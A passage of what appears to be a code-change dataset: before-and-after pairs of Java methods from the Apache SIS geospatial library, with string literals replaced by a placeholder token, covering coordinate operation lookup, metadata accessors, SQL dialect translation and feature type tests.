      operations=registry.createFromCoordinateReferenceSystemCodes(sourceID,targetID);
      inverse=Containers.isNullOrEmpty(operations);
      if (inverse) {
        operations=registry.createFromCoordinateReferenceSystemCodes(targetID,sourceID);
        if (Containers.isNullOrEmpty(operations)) {
          return null;
        }
      }
    }
  finally {
      if (!mdOnly) {
        Semaphores.clear(Semaphores.METADATA_ONLY);
      }
    }
  }
 catch (  NoSuchAuthorityCodeException|MissingFactoryResourceException e) {
    log(null,e);
    return null;
  }
  CoordinateOperation bestChoice;
  while (true) {
    bestChoice=null;
    double largestArea=0;
    double finestAccuracy=Double.POSITIVE_INFINITY;
    boolean stopAtFirstDeprecated=false;
    for (final Iterator<CoordinateOperation> it=operations.iterator(); ; ) {
      CoordinateOperation candidate;
      mdOnly=Semaphores.queryAndSet(Semaphores.METADATA_ONLY);
      try {
        try {
          if (!it.hasNext())           break;
          candidate=it.next();
        }
  finally {
          if (!mdOnly) {
            Semaphores.clear(Semaphores.METADATA_ONLY);
          }
        }
      }
 catch (      BackingStoreException exception) {
        throw exception.unwrapOrRethrow(FactoryException.class);
      }
      if (candidate != null) {
        final boolean isDeprecated=(candidate instanceof Deprecable) && ((Deprecable)candidate).isDeprecated();
        if (isDeprecated && stopAtFirstDeprecated) {
          break;
        }
        final double area=Extents.area(Extents.intersection(Extents.getGeographicBoundingBox(areaOfInterest),Extents.getGeographicBoundingBox(candidate.getDomainOfValidity())));
        if (bestChoice == null || area >= largestArea) {
          final double accuracy=CRS.getLinearAccuracy(candidate);
          if (bestChoice == null || area != largestArea || accuracy < finestAccuracy) {
            bestChoice=candidate;
            if (!Double.isNaN(area)) {
              largestArea=area;
            }
            finestAccuracy=Double.isNaN(accuracy) ? Double.POSITIVE_INFINITY : accuracy;
            stopAtFirstDeprecated=!isDeprecated;
          }
        }
      }
    }
    if (bestChoice == null)     break;
    final CoordinateOperation deferred=bestChoice;
    try {
      if (bestChoice instanceof DeferredCoordinateOperation) {
        bestChoice=((DeferredCoordinateOperation)bestChoice).create();
      }
      if (bestChoice instanceof SingleOperation && bestChoice.getMathTransform() == null) {
        bestChoice=fromDefiningConversion((SingleOperation)bestChoice,inverse ? targetCRS : sourceCRS,inverse ? sourceCRS : targetCRS);
        if (bestChoice == null) {
          return null;
        }
      }
      if (inverse) {
        bestChoice=inverse(bestChoice);
      }
    }
 catch (    NoninvertibleTransformException|MissingFactoryResourceException e) {
      boolean removed;
      try {
        removed=operations.remove(deferred);
      }
 catch (      UnsupportedOperationException ignored) {
        operations=new ArrayList<>(operations);
        removed=operations.remove(deferred);
      }
      if (removed) {
        log(null,e);
        continue;
      }
      throw (e instanceof FactoryException) ? (FactoryException)e : new FactoryException(e);
    }
    bestChoice=complete(bestChoice,sourceCRS,targetCRS);
    if (filter(bestChoice))     break;
  }
  return bestChoice;
}","/** 
 * Returns an operation for conversion or transformation between two coordinate reference systems. This method extracts the authority code from the supplied   {@code sourceCRS} and {@code targetCRS}, and submit them to the   {@link #registry}. If no operation is found for those codes, then this method returns   {@code null}.
 * @param sourceCRS  source coordinate reference system.
 * @param targetCRS  target coordinate reference system.
 * @return a coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null}if no such operation is explicitly defined in the underlying database.
 * @throws IllegalArgumentException if the coordinate systems are not of the same type or axes do not match.
 * @throws IncommensurableException if the units are not compatible or a unit conversion is non-linear.
 * @throws FactoryException if an error occurred while creating the operation.
 */
private CoordinateOperation search(final CoordinateReferenceSystem sourceCRS,final CoordinateReferenceSystem targetCRS) throws IllegalArgumentException, IncommensurableException, FactoryException {
  final List<String> sources=findCode(sourceCRS);
  if (sources.isEmpty())   return null;
  final List<String> targets=findCode(targetCRS);
  if (targets.isEmpty())   return null;
  Collection<CoordinateOperation> operations=null;
  boolean inverse=false;
  for (  final String sourceID : sources) {
    for (    final String targetID : targets) {
      if (sourceID.equals(targetID)) {
        return null;
      }
      final boolean mdOnly=Semaphores.queryAndSet(Semaphores.METADATA_ONLY);
      try {
        try {
          operations=registry.createFromCoordinateReferenceSystemCodes(sourceID,targetID);
          inverse=Containers.isNullOrEmpty(operations);
          if (inverse) {
            operations=registry.createFromCoordinateReferenceSystemCodes(targetID,sourceID);
            if (Containers.isNullOrEmpty(operations)) {
              continue;
            }
          }
        }
  finally {
          if (!mdOnly) {
            Semaphores.clear(Semaphores.METADATA_ONLY);
          }
        }
      }
 catch (      NoSuchAuthorityCodeException|MissingFactoryResourceException e) {
        log(null,e);
        continue;
      }
      break;
    }
  }
  if (operations == null) {
    return null;
  }
  CoordinateOperation bestChoice;
  while (true) {
    bestChoice=null;
    double largestArea=0;
    double finestAccuracy=Double.POSITIVE_INFINITY;
    boolean stopAtFirstDeprecated=false;
    for (final Iterator<CoordinateOperation> it=operations.iterator(); ; ) {
      CoordinateOperation candidate;
      final boolean mdOnly=Semaphores.queryAndSet(Semaphores.METADATA_ONLY);
      try {
        try {
          if (!it.hasNext())           break;
          candidate=it.next();
        }
  finally {
          if (!mdOnly) {
            Semaphores.clear(Semaphores.METADATA_ONLY);
          }
        }
      }
 catch (      BackingStoreException exception) {
        throw exception.unwrapOrRethrow(FactoryException.class);
      }
      if (candidate != null) {
        final boolean isDeprecated=(candidate instanceof Deprecable) && ((Deprecable)candidate).isDeprecated();
        if (isDeprecated && stopAtFirstDeprecated) {
          break;
        }
        final double area=Extents.area(Extents.intersection(Extents.getGeographicBoundingBox(areaOfInterest),Extents.getGeographicBoundingBox(candidate.getDomainOfValidity())));
        if (bestChoice == null || area >= largestArea) {
          final double accuracy=CRS.getLinearAccuracy(candidate);
          if (bestChoice == null || area != largestArea || accuracy < finestAccuracy) {
            bestChoice=candidate;
            if (!Double.isNaN(area)) {
              largestArea=area;
            }
            finestAccuracy=Double.isNaN(accuracy) ? Double.POSITIVE_INFINITY : accuracy;
            stopAtFirstDeprecated=!isDeprecated;
          }
        }
      }
    }
    if (bestChoice == null)     break;
    final CoordinateOperation deferred=bestChoice;
    try {
      if (bestChoice instanceof DeferredCoordinateOperation) {
        bestChoice=((DeferredCoordinateOperation)bestChoice).create();
      }
      if (bestChoice instanceof SingleOperation && bestChoice.getMathTransform() == null) {
        bestChoice=fromDefiningConversion((SingleOperation)bestChoice,inverse ? targetCRS : sourceCRS,inverse ? sourceCRS : targetCRS);
        if (bestChoice == null) {
          return null;
        }
      }
      if (inverse) {
        bestChoice=inverse(bestChoice);
      }
    }
 catch (    NoninvertibleTransformException|MissingFactoryResourceException e) {
      boolean removed;
      try {
        removed=operations.remove(deferred);
      }
 catch (      UnsupportedOperationException ignored) {
        operations=new ArrayList<>(operations);
        removed=operations.remove(deferred);
      }
      if (removed) {
        log(null,e);
        continue;
      }
      throw (e instanceof FactoryException) ? (FactoryException)e : new FactoryException(e);
    }
    bestChoice=complete(bestChoice,sourceCRS,targetCRS);
    if (filter(bestChoice))     break;
  }
  return bestChoice;
}"
91679,"/** 
 * Finds the authority code for the given coordinate reference system. This method does not trust the code given by the user in its CRS - we verify it. This method may return a code even if the axis order does not match; it will be caller's responsibility to make necessary adjustments.
 */
private String findCode(final CoordinateReferenceSystem crs) throws FactoryException {
  if (codeFinder != null) {
    final Identifier identifier=IdentifiedObjects.getIdentifier(codeFinder.findSingleton(crs),null);
    if (identifier != null) {
      return identifier.getCode();
    }
  }
  return null;
}","/** 
 * Finds the authority codes for the given coordinate reference system. This method does not trust the code given by the user in its CRS - we verify it. This method may return codes even if the axis order does not match; it will be caller's responsibility to make necessary adjustments.
 */
private List<String> findCode(final CoordinateReferenceSystem crs) throws FactoryException {
  final List<String> codes=new ArrayList<>();
  if (codeFinder != null) {
    for (    final IdentifiedObject candidate : codeFinder.find(crs)) {
      final Identifier identifier=IdentifiedObjects.getIdentifier(candidate,registry.getAuthority());
      if (identifier != null) {
        final String code=identifier.getCode();
        if (Utilities.deepEquals(candidate,crs,ComparisonMode.APPROXIMATIVE)) {
          codes.add(0,code);
        }
 else {
          codes.add(code);
        }
      }
    }
  }
  return codes;
}"
91680,"/** 
 * Creates a new test case.
 * @throws FactoryException if an error occurred while creating the factory to be tested.
 */
public CoordinateOperationRegistryTest() throws FactoryException {
  final CRSAuthorityFactory crsFactory=CRS.getAuthorityFactory(""String_Node_Str"");
  assumeTrue(""String_Node_Str"",crsFactory instanceof CoordinateOperationAuthorityFactory);
  registry=new CoordinateOperationRegistry((CoordinateOperationAuthorityFactory)crsFactory,factory,null);
}","/** 
 * Creates a new test case.
 * @throws FactoryException if an error occurred while creating the factory to be tested.
 */
public CoordinateOperationRegistryTest() throws FactoryException {
  crsFactory=CRS.getAuthorityFactory(""String_Node_Str"");
  assumeTrue(""String_Node_Str"",crsFactory instanceof CoordinateOperationAuthorityFactory);
  registry=new CoordinateOperationRegistry((CoordinateOperationAuthorityFactory)crsFactory,factory,null);
}"
91681,"/** 
 * Sets restrictions on the access and use of data.
 * @param newValues  the new metadata constraints.
 */
public void setMetadataConstraints(final Collection<? extends Constraints> newValues){
  metadataConstraints=writeCollection(newValues,metadataConstraints,Constraints.class);
}","/** 
 * Sets restrictions on the access and use of metadata.
 * @param newValues  the new metadata constraints.
 * @see org.apache.sis.metadata.iso.identification.AbstractIdentification#setResourceConstraints(Collection)
 */
public void setMetadataConstraints(final Collection<? extends Constraints> newValues){
  metadataConstraints=writeCollection(newValues,metadataConstraints,Constraints.class);
}"
91682,"/** 
 * Sets information about the frequency of metadata updates, and the scope of those updates.
 * @param newValue  the new metadata maintenance.
 */
public void setMetadataMaintenance(final MaintenanceInformation newValue){
  checkWritePermission();
  metadataMaintenance=newValue;
}","/** 
 * Sets information about the frequency of metadata updates, and the scope of those updates.
 * @param newValue  the new metadata maintenance.
 * @see org.apache.sis.metadata.iso.identification.AbstractIdentification#setResourceMaintenances(Collection)
 */
public void setMetadataMaintenance(final MaintenanceInformation newValue){
  checkWritePermission();
  metadataMaintenance=newValue;
}"
91683,"/** 
 * Returns restrictions on the access and use of data.
 * @return restrictions on the access and use of data.
 */
@Override @XmlElement(name=""String_Node_Str"") public Collection<Constraints> getMetadataConstraints(){
  return metadataConstraints=nonNullCollection(metadataConstraints,Constraints.class);
}","/** 
 * Returns restrictions on the access and use of metadata.
 * @return restrictions on the access and use of metadata.
 * @see org.apache.sis.metadata.iso.identification.AbstractIdentification#getResourceConstraints()
 */
@Override @XmlElement(name=""String_Node_Str"") public Collection<Constraints> getMetadataConstraints(){
  return metadataConstraints=nonNullCollection(metadataConstraints,Constraints.class);
}"
91684,"/** 
 * Returns information about the frequency of metadata updates, and the scope of those updates.
 * @return the frequency of metadata updates and their scope, or {@code null}.
 */
@Override @XmlElement(name=""String_Node_Str"") public MaintenanceInformation getMetadataMaintenance(){
  return metadataMaintenance;
}","/** 
 * Returns information about the frequency of metadata updates, and the scope of those updates.
 * @return the frequency of metadata updates and their scope, or {@code null}.
 * @see org.apache.sis.metadata.iso.identification.AbstractIdentification#getResourceMaintenances()
 */
@Override @XmlElement(name=""String_Node_Str"") public MaintenanceInformation getMetadataMaintenance(){
  return metadataMaintenance;
}"
91685,"/** 
 * Restrictions on the access and use of data.
 */
@Override public Collection<Constraints> getMetadataConstraints(){
  return Collections.emptyList();
}","/** 
 * Restrictions on the access and use of metadata.
 */
@Override public Collection<Constraints> getMetadataConstraints(){
  return Collections.emptyList();
}"
91686,"/** 
 * Adapts the given SQL statement from the original MS-Access dialect to the dialect of the target database. Table and column names may also be replaced.
 * @param sql  the statement in MS-Access dialect.
 * @return the SQL statement adapted to the dialect of the target database.
 */
@Override public String apply(final String sql){
  final String catalog=nonEmpty(this.catalog);
  final String schema=nonEmpty(this.schema);
  if (quote.isEmpty() && accessToAnsi.isEmpty() && schema == null && catalog == null) {
    return sql;
  }
  final StringBuilder ansi=new StringBuilder(sql.length() + 16);
  int start, end=0;
  while ((start=sql.indexOf('[',end)) >= 0) {
    ansi.append(sql,end,start);
    if ((end=sql.indexOf(']',++start)) < 0) {
      throw new IllegalArgumentException(Errors.format(Errors.Keys.MissingCharacterInElement_2,sql.substring(start),']'));
    }
    final String name=sql.substring(start,end++);
    if (CharSequences.isUpperCase(name)) {
      ansi.append(accessToAnsi.getOrDefault(name,name));
    }
 else {
      if (catalog != null) {
        ansi.append(quote).append(catalog).append(quote).append('.');
      }
      if (schema != null) {
        ansi.append(quote).append(schema).append(quote).append('.');
      }
      if (quoteTableNames) {
        ansi.append(quote);
      }
      if (schema == null) {
        ansi.append(TABLE_PREFIX);
      }
      if (quoteTableNames) {
        ansi.append(accessToAnsi.getOrDefault(name,name)).append(quote);
      }
 else {
        for (        final String word : name.split(""String_Node_Str"")) {
          ansi.append(accessToAnsi.getOrDefault(word,word));
        }
      }
    }
  }
  ansi.append(sql,end,sql.length());
  if (useBoolean) {
    int w=ansi.indexOf(""String_Node_Str"");
    if (w >= 0) {
      w+=5;
      for (      final String field : BOOLEAN_FIELDS) {
        int p=ansi.indexOf(field,w);
        if (p >= 0) {
          p+=field.length();
          if (!replaceIfEquals(ansi,p,""String_Node_Str"",""String_Node_Str"") && !replaceIfEquals(ansi,p,""String_Node_Str"",""String_Node_Str"")) {
            if ((p=ansi.lastIndexOf(""String_Node_Str"",p)) > w) {
              replaceIfEquals(ansi,p - 3,""String_Node_Str"",""String_Node_Str"");
            }
          }
        }
      }
    }
  }
  return ansi.toString();
}","/** 
 * Adapts the given SQL statement from the original MS-Access dialect to the dialect of the target database. Table and column names may also be replaced.
 * @param sql  the statement in MS-Access dialect.
 * @return the SQL statement adapted to the dialect of the target database.
 */
@Override public String apply(final String sql){
  final String catalog=nonEmpty(this.catalog);
  final String schema=nonEmpty(this.schema);
  if (quote.isEmpty() && accessToAnsi.isEmpty() && schema == null && catalog == null) {
    return sql;
  }
  final StringBuilder ansi=new StringBuilder(sql.length() + 16);
  int start, end=0;
  while ((start=sql.indexOf('[',end)) >= 0) {
    ansi.append(sql,end,start);
    if ((end=sql.indexOf(']',++start)) < 0) {
      throw new IllegalArgumentException(Errors.format(Errors.Keys.MissingCharacterInElement_2,sql.substring(start),']'));
    }
    final String name=sql.substring(start,end++);
    if (CharSequences.isUpperCase(name)) {
      ansi.append(accessToAnsi.getOrDefault(name,name));
    }
 else {
      if (catalog != null) {
        ansi.append(quote).append(catalog).append(quote).append('.');
      }
      if (schema != null) {
        ansi.append(quote).append(schema).append(quote).append('.');
      }
      if (quoteTableNames) {
        ansi.append(quote);
      }
      if (isPrefixed) {
        ansi.append(TABLE_PREFIX);
      }
      if (quoteTableNames) {
        ansi.append(accessToAnsi.getOrDefault(name,name)).append(quote);
      }
 else {
        for (        final String word : name.split(""String_Node_Str"")) {
          ansi.append(accessToAnsi.getOrDefault(word,word));
        }
      }
    }
  }
  ansi.append(sql,end,sql.length());
  if (useBoolean) {
    int w=ansi.indexOf(""String_Node_Str"");
    if (w >= 0) {
      w+=5;
      for (      final String field : BOOLEAN_FIELDS) {
        int p=ansi.indexOf(field,w);
        if (p >= 0) {
          p+=field.length();
          if (!replaceIfEquals(ansi,p,""String_Node_Str"",""String_Node_Str"") && !replaceIfEquals(ansi,p,""String_Node_Str"",""String_Node_Str"")) {
            if ((p=ansi.lastIndexOf(""String_Node_Str"",p)) > w) {
              replaceIfEquals(ansi,p - 3,""String_Node_Str"",""String_Node_Str"");
            }
          }
        }
      }
    }
  }
  return ansi.toString();
}"
91687,"/** 
 * Sets the value of all non-final fields. This method performs two steps: <ol class=""verbose""> <li>Finds the schema that seems to contain the EPSG tables. If there is more than one schema containing the tables, gives precedence to the schema named ""EPSG"" if one is found. If there is no schema named ""EPSG"", takes an arbitrary schema. It may be the empty string if the tables are not contained in a schema.</li> <li>Fills the   {@link #accessToAnsi} map. That map translates the table and column names used in the SQLstatements into the names used by the database. Two conventions are understood: the names used in the MS-Access database or the names used in the SQL scripts. Both of them are distributed by EPSG.</li> </ol>
 */
final void setup(final DatabaseMetaData md) throws SQLException {
  final boolean toUpperCase=md.storesUpperCaseIdentifiers();
  for (int i=SENTINEL.length; --i >= 0; ) {
    String table=SENTINEL[i];
    if (toUpperCase && i != MIXED_CASE) {
      table=table.toUpperCase(Locale.US);
    }
    try (ResultSet result=md.getTables(catalog,schema,table,null)){
      if (result.next()) {
        isTableFound=true;
        quoteTableNames=(i == MIXED_CASE);
        do {
          catalog=result.getString(""String_Node_Str"");
          schema=result.getString(""String_Node_Str"");
        }
 while (!Constants.EPSG.equalsIgnoreCase(schema) && result.next());
        if (schema == null)         schema=""String_Node_Str"";
        break;
      }
    }
   }
  boolean translateColumns=true;
  accessToAnsi.clear();
  if (quoteTableNames) {
    try (ResultSet result=md.getColumns(catalog,schema,""String_Node_Str"",""String_Node_Str"")){
      translateColumns=!result.next();
    }
   }
 else {
    accessToAnsi.put(""String_Node_Str"",""String_Node_Str"");
    accessToAnsi.put(""String_Node_Str"",""String_Node_Str"");
  }
  if (translateColumns) {
    accessToAnsi.put(""String_Node_Str"",""String_Node_Str"");
  }
  String deprecated=""String_Node_Str"";
  if (md.storesLowerCaseIdentifiers()) {
    deprecated=deprecated.toLowerCase(Locale.US);
  }
  try (ResultSet result=md.getColumns(catalog,schema,null,deprecated)){
    while (result.next()) {
      if (CharSequences.endsWith(result.getString(""String_Node_Str""),""String_Node_Str"",true)) {
        final int type=result.getInt(""String_Node_Str"");
        useBoolean=(type == Types.BOOLEAN) || (type == Types.BIT);
        break;
      }
    }
  }
 }","/** 
 * Sets the value of all non-final fields. This method performs two steps: <ol class=""verbose""> <li>Finds the schema that seems to contain the EPSG tables. If there is more than one schema containing the tables, gives precedence to the schema named ""EPSG"" if one is found. If there is no schema named ""EPSG"", takes an arbitrary schema. It may be the empty string if the tables are not contained in a schema.</li> <li>Fills the   {@link #accessToAnsi} map. That map translates the table and column names used in the SQLstatements into the names used by the database. Two conventions are understood: the names used in the MS-Access database or the names used in the SQL scripts. Both of them are distributed by EPSG.</li> </ol>
 */
final void setup(final DatabaseMetaData md) throws SQLException {
  final boolean toUpperCase=md.storesUpperCaseIdentifiers();
  for (int i=SENTINEL.length; --i >= 0; ) {
    String table=SENTINEL[i];
    if (toUpperCase && i != MIXED_CASE) {
      table=table.toUpperCase(Locale.US);
    }
    try (ResultSet result=md.getTables(catalog,schema,table,null)){
      if (result.next()) {
        isTableFound=true;
        isPrefixed=table.startsWith(TABLE_PREFIX);
        quoteTableNames=(i == MIXED_CASE);
        do {
          catalog=result.getString(""String_Node_Str"");
          schema=result.getString(""String_Node_Str"");
        }
 while (!Constants.EPSG.equalsIgnoreCase(schema) && result.next());
        if (schema == null)         schema=""String_Node_Str"";
        break;
      }
    }
   }
  boolean translateColumns=true;
  accessToAnsi.clear();
  if (quoteTableNames) {
    try (ResultSet result=md.getColumns(catalog,schema,""String_Node_Str"",""String_Node_Str"")){
      translateColumns=!result.next();
    }
   }
 else {
    accessToAnsi.put(""String_Node_Str"",""String_Node_Str"");
    accessToAnsi.put(""String_Node_Str"",""String_Node_Str"");
  }
  if (translateColumns) {
    accessToAnsi.put(""String_Node_Str"",""String_Node_Str"");
  }
  String deprecated=""String_Node_Str"";
  if (md.storesLowerCaseIdentifiers()) {
    deprecated=deprecated.toLowerCase(Locale.US);
  }
  try (ResultSet result=md.getColumns(catalog,schema,null,deprecated)){
    while (result.next()) {
      if (CharSequences.endsWith(result.getString(""String_Node_Str""),""String_Node_Str"",true)) {
        final int type=result.getInt(""String_Node_Str"");
        useBoolean=(type == Types.BOOLEAN) || (type == Types.BIT);
        break;
      }
    }
  }
 }"
91688,"/** 
 * Creates a sub-type of the ""city"" type with only one additional property, a string giving the parliament name. The feature contains the following attribute: <ul> <li>  {@code city}       as a  {@link String}  (mandatory)</li><li> {@code population} as an {@link Integer} (mandatory)</li><li> {@code parliament} as a  {@link String}  (mandatory)</li></ul>
 * @return the feature for a capital.
 */
public static DefaultFeatureType capital(){
  return new DefaultFeatureType(singletonMap(DefaultFeatureType.NAME_KEY,""String_Node_Str""),false,new DefaultFeatureType[]{city()},DefaultAttributeTypeTest.parliament());
}","/** 
 * Creates a sub-type of the ""city"" type with only one additional property, a string giving the parliament name. The feature contains the following attribute: <ul> <li>  {@code city}       as a  {@link String}  (mandatory)</li><li> {@code population} as an {@link Integer} (mandatory)</li><li> {@code parliament} as a  {@link String}  (mandatory)</li></ul>
 * @return the feature for a capital.
 */
public static DefaultFeatureType capital(){
  return new DefaultFeatureType(name(""String_Node_Str""),false,new DefaultFeatureType[]{city()},DefaultAttributeTypeTest.parliament());
}"
91689,"/** 
 * Same than   {@link #testNameCollision()}, but resolving collisions with usage of names of the form   {@code ""head:tip""}.
 * @since 0.6
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testQualifiedNames(){
  final NameFactory factory=DefaultFactories.forBuildin(NameFactory.class);
  final DefaultAttributeType<String> city=new DefaultAttributeType<>(singletonMap(DefaultAttributeType.NAME_KEY,factory.createGenericName(null,""String_Node_Str"",""String_Node_Str"")),String.class,1,1,null);
  final DefaultAttributeType<Integer> cityId=new DefaultAttributeType<>(singletonMap(DefaultAttributeType.NAME_KEY,factory.createGenericName(null,""String_Node_Str"",""String_Node_Str"")),Integer.class,1,1,null);
  final DefaultAttributeType<Integer> population=new DefaultAttributeType<>(singletonMap(DefaultAttributeType.NAME_KEY,factory.createGenericName(null,""String_Node_Str"",""String_Node_Str"")),Integer.class,1,1,null);
  final DefaultFeatureType feature=new DefaultFeatureType(singletonMap(DefaultAttributeType.NAME_KEY,""String_Node_Str""),false,null,city,cityId,population);
  final Iterator<PropertyType> it=feature.getProperties(false).iterator();
  assertSame(""String_Node_Str"",city,it.next());
  assertSame(""String_Node_Str"",cityId,it.next());
  assertSame(""String_Node_Str"",population,it.next());
  assertFalse(it.hasNext());
  assertSame(""String_Node_Str"",city,feature.getProperty(""String_Node_Str""));
  assertSame(""String_Node_Str"",cityId,feature.getProperty(""String_Node_Str""));
  assertSame(""String_Node_Str"",population,feature.getProperty(""String_Node_Str""));
  assertSame(""String_Node_Str"",population,feature.getProperty(""String_Node_Str""));
  try {
    feature.getProperty(""String_Node_Str"");
    fail(""String_Node_Str"");
  }
 catch (  IllegalArgumentException e) {
    final String message=e.getMessage();
    assertTrue(message,message.contains(""String_Node_Str""));
    assertTrue(message,message.contains(""String_Node_Str""));
  }
}","/** 
 * Same than   {@link #testNameCollision()}, but resolving collisions with usage of names of the form   {@code ""head:tip""}.
 * @since 0.6
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testQualifiedNames(){
  final NameFactory factory=DefaultFactories.forBuildin(NameFactory.class);
  final DefaultAttributeType<String> city=new DefaultAttributeType<>(name(factory.createGenericName(null,""String_Node_Str"",""String_Node_Str"")),String.class,1,1,null);
  final DefaultAttributeType<Integer> cityId=new DefaultAttributeType<>(name(factory.createGenericName(null,""String_Node_Str"",""String_Node_Str"")),Integer.class,1,1,null);
  final DefaultAttributeType<Integer> population=new DefaultAttributeType<>(name(factory.createGenericName(null,""String_Node_Str"",""String_Node_Str"")),Integer.class,1,1,null);
  final DefaultFeatureType feature=new DefaultFeatureType(name(""String_Node_Str""),false,null,city,cityId,population);
  final Iterator<PropertyType> it=feature.getProperties(false).iterator();
  assertSame(""String_Node_Str"",city,it.next());
  assertSame(""String_Node_Str"",cityId,it.next());
  assertSame(""String_Node_Str"",population,it.next());
  assertFalse(it.hasNext());
  assertSame(""String_Node_Str"",city,feature.getProperty(""String_Node_Str""));
  assertSame(""String_Node_Str"",cityId,feature.getProperty(""String_Node_Str""));
  assertSame(""String_Node_Str"",population,feature.getProperty(""String_Node_Str""));
  assertSame(""String_Node_Str"",population,feature.getProperty(""String_Node_Str""));
  try {
    feature.getProperty(""String_Node_Str"");
    fail(""String_Node_Str"");
  }
 catch (  IllegalArgumentException e) {
    final String message=e.getMessage();
    assertTrue(message,message.contains(""String_Node_Str""));
    assertTrue(message,message.contains(""String_Node_Str""));
  }
}"
91690,"/** 
 * Creates a simple feature type without super-types. The feature contains the following attributes: <ul> <li>  {@code city}       as a  {@link String}  (mandatory)</li><li> {@code population} as an {@link Integer} (mandatory)</li></ul>
 * @return the feature for a city.
 */
public static DefaultFeatureType city(){
  final Map<String,Object> identification=new HashMap<>();
  final DefaultAttributeType<String> city=DefaultAttributeTypeTest.city(identification);
  final DefaultAttributeType<Integer> population=DefaultAttributeTypeTest.population(identification);
  identification.clear();
  assertNull(identification.put(DefaultFeatureType.NAME_KEY,""String_Node_Str""));
  return new DefaultFeatureType(identification,false,null,city,population);
}","/** 
 * Creates a simple feature type without super-types. The feature contains the following attributes: <ul> <li>  {@code city}       as a  {@link String}  (mandatory)</li><li> {@code population} as an {@link Integer} (mandatory)</li></ul>
 * @return the feature for a city.
 */
public static DefaultFeatureType city(){
  final Map<String,Object> identification=new HashMap<>();
  final DefaultAttributeType<String> city=DefaultAttributeTypeTest.city(identification);
  final DefaultAttributeType<Integer> population=DefaultAttributeTypeTest.population(identification);
  return new DefaultFeatureType(name(""String_Node_Str""),false,null,city,population);
}"
91691,"/** 
 * Creates a sub-type of the ""city"" type with two additional properties. The feature contains the following attribute: <ul> <li>  {@code city}       as a  {@link String}       (mandatory)</li><li> {@code population} as an {@link Integer}      (mandatory)</li><li> {@code region}     as a  {@link CharSequence} (mandatory)  the region for which the city is a metropolis.</li><li> {@code isGlobal}   as a  {@link Boolean}      (mandatory)  whether the city has an effect on global affairs.</li></ul>
 * @return the feature for a metropolis.
 */
public static DefaultFeatureType metropolis(){
  final Map<String,Object> identification=new HashMap<>(4);
  assertNull(identification.put(DefaultFeatureType.NAME_KEY,""String_Node_Str""));
  assertNull(identification.put(DefaultFeatureType.NAME_KEY + ""String_Node_Str"",""String_Node_Str""));
  return new DefaultFeatureType(identification,false,new DefaultFeatureType[]{city()},new DefaultAttributeType<>(singletonMap(DefaultAttributeType.NAME_KEY,""String_Node_Str""),CharSequence.class,1,1,null),new DefaultAttributeType<>(singletonMap(DefaultAttributeType.NAME_KEY,""String_Node_Str""),Boolean.class,1,1,null));
}","/** 
 * Creates a sub-type of the ""city"" type with two additional properties. The feature contains the following attribute: <ul> <li>  {@code city}       as a  {@link String}       (mandatory)</li><li> {@code population} as an {@link Integer}      (mandatory)</li><li> {@code region}     as a  {@link CharSequence} (mandatory)  the region for which the city is a metropolis.</li><li> {@code isGlobal}   as a  {@link Boolean}      (mandatory)  whether the city has an effect on global affairs.</li></ul>
 * @return the feature for a metropolis.
 */
public static DefaultFeatureType metropolis(){
  final Map<String,Object> identification=new HashMap<>(4);
  assertNull(identification.put(DefaultFeatureType.NAME_KEY,""String_Node_Str""));
  assertNull(identification.put(DefaultFeatureType.NAME_KEY + ""String_Node_Str"",""String_Node_Str""));
  return new DefaultFeatureType(identification,false,new DefaultFeatureType[]{city()},new DefaultAttributeType<>(name(""String_Node_Str""),CharSequence.class,1,1,null),new DefaultAttributeType<>(name(""String_Node_Str""),Boolean.class,1,1,null));
}"
91692,"/** 
 * Creates a sub-type of the ""metropolis"" type with the ""region"" attribute overridden to the given type. The given type should be   {@link InternationalString}, but we allow other types for testing argument checks.
 */
private static DefaultFeatureType worldMetropolis(final DefaultFeatureType metropolis,final DefaultFeatureType universityCity,final DefaultAttributeType<?> temperature,final Class<?> regionType){
  return new DefaultFeatureType(singletonMap(DefaultFeatureType.NAME_KEY,""String_Node_Str""),false,new DefaultFeatureType[]{metropolis,universityCity},new DefaultAttributeType<?>[]{new DefaultAttributeType<>(singletonMap(DefaultAttributeType.NAME_KEY,""String_Node_Str""),regionType,1,1,null),temperature});
}","/** 
 * Creates a sub-type of the ""metropolis"" type with the ""region"" attribute overridden to the given type. The given type should be   {@link InternationalString}, but we allow other types for testing argument checks.
 */
private static DefaultFeatureType worldMetropolis(final DefaultFeatureType metropolis,final DefaultFeatureType universityCity,final DefaultAttributeType<?> temperature,final Class<?> regionType){
  return new DefaultFeatureType(name(""String_Node_Str""),false,new DefaultFeatureType[]{metropolis,universityCity},new DefaultAttributeType<?>[]{new DefaultAttributeType<>(name(""String_Node_Str""),regionType,1,1,null),temperature});
}"
91693,"/** 
 * Creates a sub-type of the ""city"" type with only one additional property, an arbitrary amount of strings. The feature contains the following attribute: <ul> <li>  {@code city}         as a  {@link String}  (mandatory)</li><li> {@code population}   as an {@link Integer} (mandatory)</li><li> {@code universities} as an arbitrary amount of {@link String}</li> </ul>
 * @return the feature for an university city.
 */
public static DefaultFeatureType universityCity(){
  return new DefaultFeatureType(singletonMap(DefaultFeatureType.NAME_KEY,""String_Node_Str""),false,new DefaultFeatureType[]{city()},DefaultAttributeTypeTest.universities());
}","/** 
 * Creates a sub-type of the ""city"" type with only one additional property, an arbitrary amount of strings. The feature contains the following attribute: <ul> <li>  {@code city}         as a  {@link String}  (mandatory)</li><li> {@code population}   as an {@link Integer} (mandatory)</li><li> {@code universities} as an arbitrary amount of {@link String}</li> </ul>
 * @return the feature for an university city.
 */
public static DefaultFeatureType universityCity(){
  return new DefaultFeatureType(name(""String_Node_Str""),false,new DefaultFeatureType[]{city()},DefaultAttributeTypeTest.universities());
}"
91694,"/** 
 * Tests the ommission of a property that duplicate a property already declared in the parent. This is a little bit different than   {@link #testPropertyOverride()} since the duplicated propertyshould be completely omitted.
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testPropertyDuplication(){
  DefaultFeatureType city=city();
  city=new DefaultFeatureType(singletonMap(DefaultFeatureType.NAME_KEY,""String_Node_Str""),false,new DefaultFeatureType[]{city()},city.getProperty(""String_Node_Str""));
  assertPropertiesEquals(city,false);
  assertPropertiesEquals(city,true,""String_Node_Str"",""String_Node_Str"");
}","/** 
 * Tests the ommission of a property that duplicate a property already declared in the parent. This is a little bit different than   {@link #testPropertyOverride()} since the duplicated propertyshould be completely omitted.
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testPropertyDuplication(){
